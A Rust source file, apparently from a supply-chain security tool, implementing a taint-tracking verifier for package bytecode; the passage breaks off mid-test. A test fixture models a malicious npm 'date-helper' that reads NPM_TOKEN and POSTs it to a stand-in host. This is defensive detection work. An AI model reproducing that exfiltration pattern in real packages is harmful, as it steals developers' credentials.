use std::cell::RefCell;
use std::collections::BTreeSet;
use std::collections::HashMap;
use std::error::Error;
use std::fmt;

use omc_cap::{Capability, Policy, Sink};
use omc_format::{
    BehaviorType, CapOp, Function, FunctionId, ImportId, Module, ModuleId, Op,
};
use omc_taint::Label;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerifyFinding {
    pub function: String,
    pub instruction: usize,
    pub message: String,
}

impl VerifyFinding {
    fn new(function: &Function, instruction: usize, message: impl Into<String>) -> Self {
        Self {
            function: function.name.clone(),
            instruction,
            message: message.into(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerifyError {
    pub findings: Vec<VerifyFinding>,
}

impl fmt::Display for VerifyError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        for finding in &self.findings {
            writeln!(
                f,
                "{}[{}]: {}",
                finding.function, finding.instruction, finding.message
            )?;
        }
        Ok(())
    }
}

impl Error for VerifyError {}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerificationReport {
    pub observed_capabilities: Vec<Capability>,
}

// ---------------------------------------------------------------------------
// Callee resolution
// ---------------------------------------------------------------------------

/// Resolves the static call targets the interprocedural engine needs. Within a
/// single `verify_module` the resolver knows only the module's own functions
/// (so `CallLocal` resolves but `CallImport` does not — a foreign body); the
/// whole-program resolver additionally resolves `CallImport` across the linked
/// graph. One engine consumes either resolver, so the taint analysis is shared.
pub trait CalleeResolver {
    /// Resolve a `CallLocal(id)` issued from `module_id` to a callee body.
    fn resolve_local<'a>(
        &'a self,
        module_id: &ModuleId,
        id: FunctionId,
    ) -> Option<CalleeRef<'a>>;

    /// Resolve a `CallImport(import)` issued from `module_id`. Returns `None`
    /// for a single-module resolver (the import body is foreign / unknown).
    fn resolve_import<'a>(
        &'a self,
        _module_id: &ModuleId,
        _import: ImportId,
    ) -> Option<CalleeRef<'a>> {
        None
    }
}

/// A resolved callee: the module it lives in plus a borrow of its body. The
/// module id is carried so the engine can re-resolve the callee's own
/// `CallLocal`/`CallImport` in the right namespace.
#[derive(Clone, Copy)]
pub struct CalleeRef<'a> {
    pub module_id: &'a ModuleId,
    pub function: &'a Function,
}

/// Resolver scoped to a single module: only `CallLocal` resolves; `CallImport`
/// is foreign and handled conservatively by the engine.
struct ModuleResolver<'a> {
    module: &'a Module,
}

impl CalleeResolver for ModuleResolver<'_> {
    fn resolve_local<'a>(
        &'a self,
        module_id: &ModuleId,
        id: FunctionId,
    ) -> Option<CalleeRef<'a>> {
        if *module_id != self.module.id {
            return None;
        }
        self.module.function(id).map(|function| CalleeRef {
            module_id: &self.module.id,
            function,
        })
    }
}

// ---------------------------------------------------------------------------
// Public entry points
// ---------------------------------------------------------------------------

pub fn verify_module(module: &Module, policy: &Policy) -> Result<VerificationReport, VerifyError> {
    let resolver = ModuleResolver { module };
    verify_module_with_resolver(module, policy, &resolver)
}

/// Internal driver shared by single-module and whole-program verification. It
/// runs shape checks per function, then runs the interprocedural taint/policy
/// engine over each function as an analysis ENTRY (all args = Public, i.e.
/// external user input), accumulating findings + observed capabilities.
fn verify_module_with_resolver(
    module: &Module,
    policy: &Policy,
    resolver: &dyn CalleeResolver,
) -> Result<VerificationReport, VerifyError> {
    let function_ids = module
        .functions
        .iter()
        .map(|function| function.id)
        .collect::<BTreeSet<_>>();
    let mut findings = Vec::new();
    let mut observed_capabilities = Vec::new();

    let engine = InterpEngine::new(resolver, policy);

    for function in &module.functions {
        verify_function_shape(module, function, &function_ids, &mut findings);

        // Analyze each function as an entry point with all-Public arguments
        // (external/user input). Context-sensitive callee analysis fires from
        // here for any CallLocal/CallImport reached.
        let arg_labels = vec![Label::Public; function.args as usize];
        let summary = engine.analyze(
            &module.id,
            function,
            module.declared_behavior,
            &arg_labels,
        );
        findings.extend(summary.findings);
        observed_capabilities.extend(summary.observed_capabilities);
    }

    if findings.is_empty() {
        Ok(VerificationReport {
            observed_capabilities,
        })
    } else {
        Err(VerifyError { findings })
    }
}

/// Whole-program verification over a closed linked graph. Resolves BOTH
/// `CallLocal` (within each module) and `CallImport` (across modules, via the
/// linker's resolution table) and runs the SAME interprocedural taint engine,
/// so cross-package laundering (a secret read in package A, passed to package B
/// which posts it) is rejected. `entry` selects the module whose functions are
/// analyzed as entry points; its transitive callees are pulled in on demand.
///
/// The caller supplies the modules and a resolver closure mapping
/// `(module_id, import_id) -> (target_module_id, target_function_id)` — exactly
/// what `omc_linker::LinkedProgram::resolution` provides.
pub fn verify_program<'a, R>(
    modules: &'a HashMap<ModuleId, Module>,
    entry: &ModuleId,
    policy: &Policy,
    import_resolver: R,
) -> Result<VerificationReport, VerifyError>
where
    R: Fn(&ModuleId, ImportId) -> Option<(ModuleId, FunctionId)>,
{
    let entry_module = match modules.get(entry) {
        Some(module) => module,
        None => {
            return Err(VerifyError {
                findings: vec![VerifyFinding {
                    function: String::new(),
                    instruction: 0,
                    message: format!("entry module `{entry}` not found in program"),
                }],
            });
        }
    };

    let resolver = ProgramResolver {
        modules,
        import_resolver,
    };
    verify_module_with_resolver(entry_module, policy, &resolver)
}

/// Whole-program resolver: resolves `CallLocal` against the callee's own module
/// and `CallImport` through the linker resolution closure.
struct ProgramResolver<'a, R> {
    modules: &'a HashMap<ModuleId, Module>,
    import_resolver: R,
}

impl<R> CalleeResolver for ProgramResolver<'_, R>
where
    R: Fn(&ModuleId, ImportId) -> Option<(ModuleId, FunctionId)>,
{
    fn resolve_local<'a>(
        &'a self,
        module_id: &ModuleId,
        id: FunctionId,
    ) -> Option<CalleeRef<'a>> {
        let module = self.modules.get(module_id)?;
        let function = module.function(id)?;
        // Return a borrow keyed by the module's stored id so the namespace
        // stays correct for the callee's own intra-module calls.
        Some(CalleeRef {
            module_id: &module.id,
            function,
        })
    }

    fn resolve_import<'a>(
        &'a self,
        module_id: &ModuleId,
        import: ImportId,
    ) -> Option<CalleeRef<'a>> {
        let (target_module_id, target_fn) = (self.import_resolver)(module_id, import)?;
        let module = self.modules.get(&target_module_id)?;
        let function = module.function(target_fn)?;
        Some(CalleeRef {
            module_id: &module.id,
            function,
        })
    }
}

// ---------------------------------------------------------------------------
// Shape verification (unchanged behavior)
// ---------------------------------------------------------------------------

fn verify_function_shape(
    _module: &Module,
    function: &Function,
    function_ids: &BTreeSet<FunctionId>,
    findings: &mut Vec<VerifyFinding>,
) {
    let code_len = function.code.len();
    for (index, op) in function.code.iter().enumerate() {
        match op {
            Op::CallLocal(id) if !function_ids.contains(id) => findings.push(VerifyFinding::new(
                function,
                index,
                format!("call to unknown local function {id}"),
            )),
            Op::LoadLocal(id) | Op::StoreLocal(id) if *id >= function.locals => {
                findings.push(VerifyFinding::new(
                    function,
                    index,
                    format!("local {id} exceeds local count {}", function.locals),
                ))
            }
            Op::Jmp(offset) | Op::JmpIfFalse(offset) => {
                if jump_target(index, *offset, code_len).is_none() {
                    findings.push(VerifyFinding::new(
                        function,
                        index,
                        format!("jump target out of bounds (offset {offset})"),
                    ));
                }
            }
            _ => {}
        }
    }
}

/// Resolve a relative branch into an absolute instruction index, or `None` if
/// the target falls outside `[0, code_len]`. A target equal to `code_len`
/// (fall-off-the-end) is permitted as a structured-exit target, matching the
/// VM which terminates the function when `pc == code.len()`.
fn jump_target(index: usize, offset: i32, code_len: usize) -> Option<usize> {
    let base = (index + 1) as i64;
    let target = base + offset as i64;
    if target < 0 || target > code_len as i64 {
        None
    } else {
        Some(target as usize)
    }
}

// ---------------------------------------------------------------------------
// Abstract state
// ---------------------------------------------------------------------------

/// Abstract machine state at a program point: the taint label of every stack
/// slot plus the taint label of every local. States form a finite
/// join-semilattice (labels join via `Label::join`, which is bounded by
/// `Mixed` over a finite alphabet), so the fixpoint below always terminates.
#[derive(Debug, Clone, PartialEq, Eq)]
struct AbstractState {
    stack: Vec<Label>,
    locals: Vec<Label>,
}

impl AbstractState {
    fn entry(function: &Function) -> Self {
        Self {
            stack: Vec::new(),
            locals: vec![Label::Public; function.locals as usize],
        }
    }

    /// Join two incoming states element-wise. Returns `None` if the stack
    /// depths disagree, which means control flow merged unbalanced paths.
    fn join(&self, other: &AbstractState) -> Option<AbstractState> {
        if self.stack.len() != other.stack.len() {
            return None;
        }
        let stack = self
            .stack
            .iter()
            .zip(other.stack.iter())
            .map(|(a, b)| a.clone().join(b.clone()))
            .collect();
        let locals = self
            .locals
            .iter()
            .zip(other.locals.iter())
            .map(|(a, b)| a.clone().join(b.clone()))
            .collect();
        Some(AbstractState { stack, locals })
    }
}

/// Static successors of an instruction. The verifier already validated branch
/// targets in `verify_function_shape`, so any unresolved target here is
/// reported as a fall-off and produces no edges (deny-by-default).
fn successors(function: &Function, index: usize) -> Vec<usize> {
    let code_len = function.code.len();
    match &function.code[index] {
        // Returns and traps terminate the path; no successors.
        Op::Return | Op::Trap(_) => Vec::new(),
        Op::Jmp(offset) => jump_target(index, *offset, code_len)
            .into_iter()
            .collect(),
        Op::JmpIfFalse(offset) => {
            let mut edges = vec![index + 1];
            if let Some(target) = jump_target(index, *offset, code_len) {
                edges.push(target);
            }
            edges
        }
        _ => vec![index + 1],
    }
    .into_iter()
    .filter(|target| *target < code_len)
    .collect()
}

// ---------------------------------------------------------------------------
// Interprocedural engine
// ---------------------------------------------------------------------------

/// The result of analyzing one function with one argument-label signature: its
/// findings, the capabilities observed within it (transitively), and the join
/// of the labels live at its `Return` points (the call's result label).
#[derive(Debug, Clone)]
struct CalleeSummary {
    findings: Vec<VerifyFinding>,
    observed_capabilities: Vec<Capability>,
    return_label: Label,
}

/// Context-sensitive interprocedural taint/policy engine. Parameterized by a
/// `CalleeResolver` so the same analysis runs intra-module (`CallLocal` only)
/// and whole-program (`CallLocal` + `CallImport`).
/// Per-frame state for an in-progress (possibly recursive) analysis. When a
/// recursive call re-enters this frame, it sets `cycle_hit` and widens
/// `widened_args` toward the join of every argument signature seen at the
/// recursive edge, then returns the frame's current `assumed_return`. The
/// outermost `analyze` re-runs the body under the widened assumptions until both
/// stabilise, so a secret introduced on the recursive edge IS checked at the
/// body's sinks. This terminates because the label lattice is finite and the
/// joins are monotone (sound over-approximation).
struct FrameState {
    id: (ModuleId, FunctionId),
    assumed_return: Label,
    widened_args: Vec<Label>,
    cycle_hit: bool,
}

struct InterpEngine<'a> {
    resolver: &'a dyn CalleeResolver,
    policy: &'a Policy,
    /// Memo by (module_id, fn_id, arg-label signature) -> summary. Bounds work
    /// and makes recursion-through-different-signatures terminate (the label
    /// lattice is finite, so only finitely many signatures exist).
    memo: RefCell<HashMap<CalleeKey, CalleeSummary>>,
    /// Stack of in-progress frames for cycle detection + recursive widening.
    in_progress: RefCell<Vec<FrameState>>,
}

type CalleeKey = (ModuleId, FunctionId, Vec<Label>);

impl<'a> InterpEngine<'a> {
    fn new(resolver: &'a dyn CalleeResolver, policy: &'a Policy) -> Self {
        Self {
            resolver,
            policy,
            memo: RefCell::new(HashMap::new()),
            in_progress: RefCell::new(Vec::new()),
        }
    }

    /// Analyze `function` (living in `module_id`) under the given actual
    /// argument labels. Returns its summary. Recursion/cycles fall back to a
    /// conservative taint-transparent summary (return = join of arg labels)
    /// without descending, which is a sound over-approximation and terminates.
    fn analyze(
        &self,
        module_id: &ModuleId,
        function: &Function,
        declared_behavior: BehaviorType,
        arg_labels: &[Label],
    ) -> CalleeSummary {
        let key: CalleeKey = (module_id.clone(), function.id, arg_labels.to_vec());
        if let Some(summary) = self.memo.borrow().get(&key) {
            return summary.clone();
        }

        let frame_id = (module_id.clone(), function.id);

        // Cycle: this frame is already on the analysis stack. Record the
        // incoming argument labels (widening the frame's assumed args) and
        // return the frame's current assumed return label. The outermost
        // `analyze` below re-runs the body under the widened args/return until
        // both stabilise, so a secret introduced on the recursive edge is not
        // lost — closing the recursion soundness hole while still terminating.
        {
            let mut frames = self.in_progress.borrow_mut();
            if let Some(frame) = frames.iter_mut().rev().find(|f| f.id == frame_id) {
                frame.cycle_hit = true;
                frame.widened_args = join_args(&frame.widened_args, arg_labels);
                return CalleeSummary {
                    findings: Vec::new(),
                    observed_capabilities: Vec::new(),
                    return_label: frame.assumed_return.clone(),
                };
            }
        }

        // Outermost entry for this frame. A single pass suffices unless the body
        // turns out to be recursive, in which case we widen the argument and
        // return assumptions and re-analyze to a fixed point. Between
        // non-converged iterations we restore the memo to its pre-analysis state
        // so no nested summary computed under a weaker assumption leaks through.
        let memo_snapshot = self.memo.borrow().clone();
        let mut assumed_args = arg_labels.to_vec();
        let mut assumed_return = Label::Public;
        let summary = loop {
            self.in_progress.borrow_mut().push(FrameState {
                id: frame_id.clone(),
                assumed_return: assumed_return.clone(),
                widened_args: assumed_args.clone(),
                cycle_hit: false,
            });
            let summary = self.analyze_body(module_id, function, declared_behavior, &assumed_args);
            let frame = self
                .in_progress
                .borrow_mut()
                .pop()
                .expect("frame pushed above is present");

            if !frame.cycle_hit {
                // Non-recursive: the single pass is exact (original behaviour).
                break summary;
            }

            let widened_args = join_args(&assumed_args, &frame.widened_args);
            let widened_return = assumed_return.clone().join(summary.return_label.clone());
            if widened_args == assumed_args && widened_return == assumed_return {
                // Fixpoint reached: the body has been analyzed under argument and
                // return labels that subsume every recursive edge.
                break summary;
            }
            assumed_args = widened_args;
            assumed_return = widened_return;
            *self.memo.borrow_mut() = memo_snapshot.clone();
        };

        self.memo.borrow_mut().insert(key, summary.clone());
        summary
    }

    fn analyze_body(
        &self,
        module_id: &ModuleId,
        function: &Function,
        declared_behavior: BehaviorType,
        arg_labels: &[Label],
    ) -> CalleeSummary {
        let mut findings = Vec::new();
        let mut observed_capabilities = Vec::new();
        let mut return_label = Label::Public;

        let code_len = function.code.len();
        if code_len == 0 {
            return CalleeSummary {
                findings,
                observed_capabilities,
                return_label,
            };
        }

        // ---- Fixpoint over the control-flow graph --------------------------
        let mut in_state: Vec<Option<AbstractState>> = vec![None; code_len];
        in_state[0] = Some(AbstractState::entry(function));
        let mut depth_mismatch = vec![false; code_len];

        let mut worklist: Vec<usize> = vec![0];
        while let Some(index) = worklist.pop() {
            let Some(current) = in_state[index].clone() else {
                continue;
            };
            let out = self.transfer(module_id, function, arg_labels, index, &current);
            for successor in successors(function, index) {
                let merged = match &in_state[successor] {
                    None => Some(out.clone()),
                    Some(existing) => match existing.join(&out) {
                        Some(joined) => {
                            if joined == *existing {
                                None
                            } else {
                                Some(joined)
                            }
                        }
                        None => {
                            depth_mismatch[successor] = true;
                            None
                        }
                    },
                };
                if let Some(state) = merged {
                    in_state[successor] = Some(state);
                    worklist.push(successor);
                }
            }
        }

        // ---- Reporting pass over reachable instructions --------------------
        for (index, op) in function.code.iter().enumerate() {
            let Some(state) = &in_state[index] else {
                findings.push(VerifyFinding::new(
                    function,
                    index,
                    "unreachable instruction (no inbound control flow)",
                ));
                continue;
            };

            if depth_mismatch[index] {
                findings.push(VerifyFinding::new(
                    function,
                    index,
                    "stack depth mismatch at merge",
                ));
            }

            self.report_instruction(
                module_id,
                function,
                declared_behavior,
                arg_labels,
                index,
                op,
                state,
                &mut observed_capabilities,
                &mut findings,
            );

            // The call's return label is the join of the labels of the value
            // each reachable Return point leaves on top of the stack.
            if matches!(op, Op::Return) {
                let returned = state.stack.last().cloned().unwrap_or(Label::Public);
                return_label = return_label.clone().join(returned);
            }
        }

        CalleeSummary {
            findings,
            observed_capabilities,
            return_label,
        }
    }

    /// Pure transfer function: given the in-state, produce the out-state after
    /// executing the instruction. Underflows clamp to `Public` so the fixpoint
    /// stays total; the reporting pass surfaces them as findings.
    fn transfer(
        &self,
        module_id: &ModuleId,
        function: &Function,
        arg_labels: &[Label],
        index: usize,
        state: &AbstractState,
    ) -> AbstractState {
        let mut stack = state.stack.clone();
        let mut locals = state.locals.clone();
        let pop = |stack: &mut Vec<Label>| stack.pop().unwrap_or(Label::Public);

        match &function.code[index] {
            Op::Const(_) => stack.push(Label::Public),
            // LoadArg yields the actual caller-supplied argument label (not
            // always Public): fixes H2 laundering through argument passing.
            Op::LoadArg(i) => {
                let label = arg_labels.get(*i as usize).cloned().unwrap_or(Label::Public);
                stack.push(label);
            }
            Op::LoadLocal(id) => {
                let label = locals.get(*id as usize).cloned().unwrap_or(Label::Public);
                stack.push(label);
            }
            Op::StoreLocal(id) => {
                let label = pop(&mut stack);
                if let Some(slot) = locals.get_mut(*id as usize) {
                    *slot = label;
                }
            }
            Op::Add | Op::Sub | Op::Mul | Op::Div | Op::Mod | Op::Eq | Op::Lt | Op::Gt | Op::Le
            | Op::Ge | Op::Index => {
                let right = pop(&mut stack);
                let left = pop(&mut stack);
                stack.push(left.join(right));
            }
            Op::Slice => {
                let third = pop(&mut stack);
                let second = pop(&mut stack);
                let first = pop(&mut stack);
                stack.push(first.join(second).join(third));
            }
            Op::Len | Op::Not | Op::JsonParse | Op::JsonStringify => {
                let label = pop(&mut stack);
                stack.push(label);
            }
            Op::Pop => {
                pop(&mut stack);
            }
            Op::JmpIfFalse(_) => {
                pop(&mut stack);
            }
            Op::Jmp(_) => {}
            // Interprocedural call effect: pop the callee's argument labels
            // (VM parity => fixes H3), analyze the callee context-sensitively
            // with those labels, and push its computed return label (fixes H1).
            Op::CallLocal(id) => {
                let result = self.call_effect(
                    module_id,
                    self.resolver.resolve_local(module_id, *id),
                    &mut stack,
                );
                stack.push(result);
            }
            Op::CallImport(import) => {
                let result = self.call_effect(
                    module_id,
                    self.resolver.resolve_import(module_id, *import),
                    &mut stack,
                );
                stack.push(result);
            }
            Op::Cap(cap) => transfer_cap(cap, &mut stack),
            Op::Return | Op::Trap(_) => {}
        }

        AbstractState { stack, locals }
    }

    /// Compute a call's stack effect (pop args, return label) for the transfer
    /// pass. If the callee is unresolved (foreign import in single-module
    /// verification, or a bad id), fall back conservatively: pop nothing extra
    /// here is unsound for depth, so we still pop the declared arity when we
    /// know it; for a fully-unknown callee we cannot know arity, so we keep the
    /// historical pop-0/push-Public behavior and let reporting flag it.
    fn call_effect(
        &self,
        _caller_module: &ModuleId,
        callee: Option<CalleeRef<'_>>,
        stack: &mut Vec<Label>,
    ) -> Label {
        let Some(callee) = callee else {
            // Unresolved callee (foreign import body unknown to this resolver).
            // Conservative: we do not know the arity or behavior. Pop nothing
            // and push Public, matching the legacy model; the reporting pass
            // documents this as an unanalyzable boundary.
            return Label::Public;
        };

        let arity = callee.function.args as usize;
        let mut arg_labels = Vec::with_capacity(arity);
        for _ in 0..arity {
            arg_labels.push(stack.pop().unwrap_or(Label::Public));
        }
        arg_labels.reverse();

        let summary = self.analyze(
            callee.module_id,
            callee.function,
            // The callee's own declared behavior is unknown to us here; use
            // Unknown so we don't spuriously flag pure-package violations on a
            // callee we don't own. Capability/flow grants still apply.
            BehaviorType::Unknown,
            &arg_labels,
        );
        summary.return_label
    }

    #[allow(clippy::too_many_arguments)]
    fn report_instruction(
        &self,
        module_id: &ModuleId,
        function: &Function,
        declared_behavior: BehaviorType,
        arg_labels: &[Label],
        index: usize,
        op: &Op,
        state: &AbstractState,
        observed_capabilities: &mut Vec<Capability>,
        findings: &mut Vec<VerifyFinding>,
    ) {
        // A working copy of the stack so we can read operands by popping.
        let mut stack = state.stack.clone();

        match op {
            Op::Const(_) | Op::LoadArg(_) | Op::LoadLocal(_) | Op::Jmp(_) | Op::Return
            | Op::Trap(_) => {}
            Op::StoreLocal(_) | Op::Len | Op::Not | Op::JsonParse | Op::JsonStringify | Op::Pop
            | Op::JmpIfFalse(_) => {
                require_depth(function, index, &stack, 1, findings);
            }
            Op::Add | Op::Sub | Op::Mul | Op::Div | Op::Mod | Op::Eq | Op::Lt | Op::Gt | Op::Le
            | Op::Ge | Op::Index => {
                require_depth(function, index, &stack, 2, findings);
            }
            Op::Slice => {
                require_depth(function, index, &stack, 3, findings);
            }
            Op::CallLocal(id) => {
                self.report_call(
                    module_id,
                    function,
                    index,
                    self.resolver.resolve_local(module_id, *id),
                    &mut stack,
                    observed_capabilities,
                    findings,
                );
            }
            Op::CallImport(import) => {
                let resolved = self.resolver.resolve_import(module_id, *import);
                if resolved.is_none() {
                    // Foreign import body not available to this resolver. In
                    // single-module verification this is expected and handled
                    // conservatively: we cannot see the callee's flows, so we
                    // neither merge findings nor pop args. The whole-program
                    // resolver DOES resolve imports and analyzes them, closing
                    // cross-module laundering. (Deny-by-default is preserved by
                    // the per-cap policy/flow checks at the actual sink op.)
                }
                self.report_call(
                    module_id,
                    function,
                    index,
                    resolved,
                    &mut stack,
                    observed_capabilities,
                    findings,
                );
            }
            Op::Cap(cap) => {
                let observed = Capability::for_cap_op(cap);
                observed_capabilities.push(observed.clone());

                if declared_behavior == BehaviorType::Pure {
                    findings.push(VerifyFinding::new(
                        function,
                        index,
                        format!("pure package contains capability instruction {observed}"),
                    ));
                }

                if let Err(error) = self.policy.require(observed) {
                    findings.push(VerifyFinding::new(function, index, error.message));
                }

                report_cap_flow(function, index, cap, self.policy, &mut stack, findings);
            }
        }

        let _ = arg_labels; // labels are consumed in transfer; kept for symmetry
    }

    /// Reporting-side handling of a call: analyze the resolved callee with the
    /// actual argument labels and MERGE its findings/capabilities into the
    /// caller (fixes H2 — a callee that routes a sensitive arg to a sink is
    /// rejected at the caller). Callee findings are re-attributed to the
    /// callee function name so the report points at the real sink.
    #[allow(clippy::too_many_arguments)]
    fn report_call(
        &self,
        _module_id: &ModuleId,
        function: &Function,
        index: usize,
        callee: Option<CalleeRef<'_>>,
        stack: &mut Vec<Label>,
        observed_capabilities: &mut Vec<Capability>,
        findings: &mut Vec<VerifyFinding>,
    ) {
        let Some(callee) = callee else {
            return;
        };

        let arity = callee.function.args as usize;
        if stack.len() < arity {
            findings.push(VerifyFinding::new(function, index, "stack underflow"));
        }
        let mut arg_labels = Vec::with_capacity(arity);
        for _ in 0..arity {
            arg_labels.push(stack.pop().unwrap_or(Label::Public));
        }
        arg_labels.reverse();

        let summary = self.analyze(
            callee.module_id,
            callee.function,
            BehaviorType::Unknown,
            &arg_labels,
        );
        findings.extend(summary.findings);
        observed_capabilities.extend(summary.observed_capabilities);
    }
}

/// Element-wise least-upper-bound of two argument-label vectors. Recursive calls
/// to the same function always pass the same arity, so lengths normally match;
/// differing lengths are handled defensively (a missing slot contributes the
/// other side's label).
fn join_args(a: &[Label], b: &[Label]) -> Vec<Label> {
    let len = a.len().max(b.len());
    (0..len)
        .map(|i| match (a.get(i), b.get(i)) {
            (Some(x), Some(y)) => x.clone().join(y.clone()),
            (Some(x), None) | (None, Some(x)) => x.clone(),
            (None, None) => Label::Public,
        })
        .collect()
}

/// Stack effect of a capability instruction, mirroring `report_cap_flow` but
/// without emitting findings (used inside the fixpoint).
fn transfer_cap(cap: &CapOp, stack: &mut Vec<Label>) {
    match cap {
        CapOp::EnvRead { name } => stack.push(Label::Env(name.clone())),
        CapOp::FsRead { path } => stack.push(Label::File(path.to_string())),
        CapOp::FsWrite {
            value_from_stack, ..
        } => {
            if *value_from_stack {
                stack.pop();
            }
            stack.push(Label::Public);
        }
        CapOp::HttpRequest { request } => {
            if request.body_from_stack {
                stack.pop();
            }
            stack.push(Label::Network(request.host.clone()));
        }
        CapOp::DnsLookup { host } => stack.push(Label::Network(host.clone())),
        CapOp::TimeNow | CapOp::RandomBytes { .. } => stack.push(Label::Public),
        CapOp::ProcSpawn {
            args_from_stack, ..
        } => {
            // Pop the dynamic argv operands (parity with the VM). ProcSpawn
            // diverges to the host on success, so it leaves nothing usable; we
            // model it as pushing nothing.
            for _ in 0..*args_from_stack {
                stack.pop();
            }
        }
        CapOp::DynamicEval {
            source_from_stack, ..
        } => {
            if *source_from_stack {
                stack.pop();
            }
            stack.push(Label::Public);
        }
    }
}

fn require_depth(
    function: &Function,
    index: usize,
    stack: &[Label],
    needed: usize,
    findings: &mut Vec<VerifyFinding>,
) {
    if stack.len() < needed {
        findings.push(VerifyFinding::new(function, index, "stack underflow"));
    }
}

fn report_cap_flow(
    function: &Function,
    index: usize,
    cap: &CapOp,
    policy: &Policy,
    stack: &mut Vec<Label>,
    findings: &mut Vec<VerifyFinding>,
) {
    match cap {
        CapOp::EnvRead { .. } | CapOp::FsRead { .. } | CapOp::DnsLookup { .. }
        | CapOp::TimeNow | CapOp::RandomBytes { .. } => {}
        CapOp::FsWrite {
            path,
            value_from_stack,
        } => {
            let label = pop_optional_body(function, index, *value_from_stack, stack, findings);
            check_flow(
                function,
                index,
                policy,
                label,
                Sink::File(path.to_string()),
                findings,
            );
        }
        CapOp::HttpRequest { request } => {
            let label =
                pop_optional_body(function, index, request.body_from_stack, stack, findings);
            check_flow(
                function,
                index,
                policy,
                label,
                Sink::Network(request.host.clone()),
                findings,
            );
        }
        CapOp::ProcSpawn {
            command,
            args_from_stack,
            ..
        } => {
            // Pop each dynamic argv operand and check its label against the
            // process sink: a tainted argv (e.g. a secret passed to spawn) is
            // rejected. ProcSpawn remains deny-by-default — the capability grant
            // is still required (checked in report_instruction). Fixes H4.
            for _ in 0..*args_from_stack {
                let label = match stack.pop() {
                    Some(label) => label,
                    None => {
                        findings.push(VerifyFinding::new(function, index, "stack underflow"));
                        Label::Public
                    }
                };
                check_flow(
                    function,
                    index,
                    policy,
                    label,
                    Sink::Process(command.clone()),
                    findings,
                );
            }
        }
        CapOp::DynamicEval { source_from_stack } => {
            let label = pop_optional_body(function, index, *source_from_stack, stack, findings);
            check_flow(function, index, policy, label, Sink::Eval, findings);
        }
    }
}

fn pop_optional_body(
    function: &Function,
    index: usize,
    required: bool,
    stack: &mut Vec<Label>,
    findings: &mut Vec<VerifyFinding>,
) -> Label {
    if !required {
        return Label::Public;
    }

    match stack.pop() {
        Some(label) => label,
        None => {
            findings.push(VerifyFinding::new(function, index, "stack underflow"));
            Label::Public
        }
    }
}

fn check_flow(
    function: &Function,
    index: usize,
    policy: &Policy,
    label: Label,
    sink: Sink,
    findings: &mut Vec<VerifyFinding>,
) {
    if let Err(error) = policy.check_flows(&label, sink) {
        findings.push(VerifyFinding::new(function, index, error.message));
    }
}

pub fn harmless_slugify_module() -> Module {
    Module {
        id: "npm:slugify-lite@1.0.0".to_owned(),
        package: "slugify-lite".to_owned(),
        version: "1.0.0".to_owned(),
        declared_behavior: BehaviorType::Pure,
        functions: vec![Function::new(
            0,
            "slugify",
            1,
            vec![Op::LoadArg(0), Op::Return],
        )],
    }
}

pub fn malicious_date_helper_module() -> Module {
    Module {
        id: "npm:date-helper@1.2.4".to_owned(),
        package: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        declared_behavior: BehaviorType::HostCapability,
        functions: vec![Function::new(
            0,
            "formatDate",
            1,
            vec![
                Op::Cap(CapOp::EnvRead {
                    name: "NPM_TOKEN".to_owned(),
                }),
                Op::Cap(CapOp::HttpRequest {
                    request: omc_format::HttpRequest::post(
                        "https://cdn-update-service.example/a",
                        "cdn-update-service.example",
                    ),
                }),
                Op::LoadArg(0),
                Op::Return,
            ],
        )],
    }
}

#[cfg(test)]
mod tests {
    use omc_cap::{Capability, LabelMatcher, Policy, Sink};

    use super::*;

    #[test]
    fn accepts_pure_module_without_capabilities() {
        let report = verify_module(&harmless_slugify_module(), &Policy::pure()).unwrap();
        assert!(report.observed_capabilities.is_empty());
    }

    #[test]
    fn accepts_slice_with_three_stack_operands() {
        let module = Module {
            id: "test:slice".to_owned(),
            package: "slice".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(omc_format::Value::Int(0)),
                    Op::Const(omc_format::Value::Int(3)),
                    Op::Slice,
                    Op::Return,
                ],
            )],
        };

        verify_module(&module, &Policy::pure()).unwrap();
    }

    #[test]
    fn rejects_slice_with_missing_stack_operands() {
        let module = Module {
            id: "test:bad-slice".to_owned(),
            package: "bad-slice".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                0,
                vec![Op::Const(omc_format::Value::Int(0)), Op::Slice, Op::Return],
            )],
        };

        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|finding| finding.message == "stack underflow"));
    }

    #[test]
    fn accepts_json_ops_with_one_stack_operand() {
        let module = Module {
            id: "test:json".to_owned(),
            package: "json".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "json",
                1,
                vec![Op::LoadArg(0), Op::JsonParse, Op::JsonStringify, Op::Return],
            )],
        };

        verify_module(&module, &Policy::pure()).unwrap();
    }

    #[test]
    fn rejects_secret_flow_even_when_capabilities_are_granted() {
        let module = malicious_date_helper_module();
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ));

        let err = verify_module(&module, &policy).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|finding| finding.message.contains("env:NPM_TOKEN may not flow")));
    }

    #[test]
    fn accepts_explicit_secret_flow_to_approved_host() {
        let module = malicious_date_helper_module();
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("cdn-update-service.example".to_owned()),
            );

        verify_module(&module, &policy).unwrap();
    }

    #[test]
    fn accepts_secret_flow_when_all_flows_are_explicitly_allowed() {
        let module = malicious_date_helper_module();
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ))
            .allow_all_flows();

        verify_module(&module, &policy).unwrap();
